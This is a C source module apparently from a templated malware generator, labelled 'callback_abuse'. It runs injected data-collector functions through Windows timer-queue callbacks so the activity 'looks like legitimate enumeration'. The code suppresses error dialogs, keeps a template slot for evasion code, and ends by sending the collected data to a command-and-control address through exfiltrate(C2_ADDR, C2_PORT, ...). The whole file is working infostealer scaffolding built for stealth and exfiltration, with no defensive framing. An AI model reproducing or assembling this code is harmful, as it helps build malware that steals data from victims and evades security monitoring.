// chunk: arch/callback_abuse
// depends: core/emit_buffer, exfil/*
// provides: main
// headers: windows.h
// note: Executes collectors via Windows callback mechanisms — looks like legitimate enumeration

#ifndef CHUNK_ARCH_CALLBACK
#define CHUNK_ARCH_CALLBACK

typedef void (*collector_fn)(void);

static collector_fn g_callback_collectors[32];
static volatile LONG g_callback_done = 0;
static int g_callback_count = 0;

static VOID CALLBACK timer_callback(PVOID param, BOOLEAN fired) {
    (void)fired;
    int idx = (int)(ULONG_PTR)param;
    if (idx >= 0 && idx < g_callback_count) {
        g_callback_collectors[idx]();
        InterlockedIncrement(&g_callback_done);
    }
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
{{EVASION_INIT}}

    init_buffer();
    if (!g_data) return 1;

    collector_fn collectors[] = {
{{COLLECTOR_FN_LIST}}
    };
    g_callback_count = sizeof(collectors) / sizeof(collectors[0]);
    for (int i = 0; i < g_callback_count && i < 32; i++)
        g_callback_collectors[i] = collectors[i];

    HANDLE timer_queue = CreateTimerQueue();
    if (!timer_queue) return 1;

    for (int i = 0; i < g_callback_count; i++) {
        HANDLE ht = NULL;
        CreateTimerQueueTimer(&ht, timer_queue, timer_callback,
                              (PVOID)(ULONG_PTR)i,
                              500 + i * 2000, 0, WT_EXECUTELONGFUNCTION);
    }

    DWORD timeout = 500 + g_callback_count * 2000 + 30000;
    DWORD waited = 0;
    while (g_callback_done < g_callback_count && waited < timeout) {
        Sleep(500);
        waited += 500;
    }
    DeleteTimerQueueEx(timer_queue, INVALID_HANDLE_VALUE);

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    return 0;
}

#endif
